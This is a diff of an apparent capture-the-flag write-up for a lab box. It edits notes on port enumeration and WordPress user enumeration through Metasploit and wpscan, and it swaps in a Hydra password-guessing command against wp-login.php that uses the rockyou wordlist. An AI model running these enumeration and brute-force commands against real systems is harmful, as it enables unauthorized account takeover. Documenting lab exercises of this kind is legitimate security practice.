@@ -136,7 +136,7 @@ PORT   STATE SERVICE
 
 ### TCP/21
 * vsftpd 3.0.3
-  * No public exploits on Exploit db.
+  * No public exploits listed on Exploit db.
 * Connected anonymously - no files or folders exposed.
 ```
 ftp 10.10.74.123
@@ -159,6 +159,7 @@ ftp>bye
 ### TCP/22
 * OpenSSH 7.6p1.
   * Vulnerable to CVE-2018-15473 - username enumeration (https://www.exploit-db.com/exploits/4521080)
+  * Enumerate openSSH users?
 ### TCP/80
 * Search for hidden directories using Gobuster.
 ```
@@ -173,9 +174,35 @@ gobuster dir --url http://TARGET_IP/ -w /usr/share/wordlists/SecLists/Discovery/
   * No public exploits on Exploit db.
 #### /wordpress/
 * Single "All in One" page published with "elyana" as author.
+* enumerate Wordpress users using Metasploit.
+```
+msf > use auxiliary/scanner/http/wordpress_login_enum
+msf auxiliary(wordpress_login_enum) > set rhosts TARGET_IP
+msf auxiliary(wordpress_login_enum) > set targeturi /wordpress
+msf auxiliary(wordpress_login_enum) > set user_file /usr/share/wordlists/rockyou.txt
+msf auxiliary(wordpress_login_enum) > set pass_file /usr/share/wordlists/rockyou.txt
+msf auxiliary(wordpress_login_enum) > exploit
+```
+```
+[+] /wordpress - Found user 'elyana' with id 1
+```
+* Use "wpscan" to identify WordPress vulnerabilites.
+```
+wpscan --update
+wpscan --url http://TARGET_IP/Wordpress > wpscan.txt
+```
+  * Insecure WordPress v5.5.1.
+    * No public exploits listed on Exploit db.
+  * twentytwenty theme v1.5 out of date as v2.5 is current.
+    * No public exploits listed on Exploit db.
+  * Mail Masta plugin v1.0.
+    * Vulnerable to [Local File Inclusion (LFI)](https://www.exploit-db.com/exploits/40290) public exploit listed on Exploit db.
+  * Reflex Gallery 3.1.7.
+    * No public exploits listed on Exploit db.
 #### wordpress/wp-login.php
-* Default Wordpress credentials are admin / password.
+* Internet search reveals that default Wordpress credentials are admin / password.
  * Trying these resulted in "Unknown username. Check again or try your email address." message.
+ * Attempting to logon using username "elyana" results in "Error: The password you entered for the username elyana is incorrect." message.
 #### /hackathons directory
 * Displays "Damn how much I hate the smell of *Vinegar :/* !!!" 
 * Viewing page source displays comments at bottom of page.
@@ -183,23 +210,10 @@ gobuster dir --url http://TARGET_IP/ -w /usr/share/wordlists/SecLists/Discovery/
 <!-- Dvc W@iyur@123 -->
 <!-- KeepGoing -->
 ```
+
 ## Initial Access
-* enumerate openSSH users?
-* enumerate Wordpress users using Metasploit.
+* password spray "/wordpress/wp-login.php" using Hydra
 ```
-msf > use auxiliary/scanner/http/wordpress_login_enum
-msf auxiliary(wordpress_login_enum) > set rhosts TARGET_IP
-msf auxiliary(wordpress_login_enum) > set targeturi /wordpress
-msf auxiliary(wordpress_login_enum) > set username elyana
-msf auxiliary(wordpress_login_enum) > set pass_file /usr/share/wordliasts/rockyou.txt
-msf auxiliary(wordpress_login_enum) > exploit
-```
-```
-[+] /wordpress - Found user 'elyana' with id 1
-```
-* bruteforce /wordpress/wp-admin.php using Hydra
-```
-```
-hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2FTARGET_IP%2Fwordpress%2Fwp-admin%2F&testcookie=1:Unknown username. Check again or try your email address." -vV
+hydra -l elyana -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2FTARGET_IP%2Fwordpress%2Fwp-admin%2F&testcookie=1:Error" -T 64 -vV
 ```
 ## Privilege Escalation
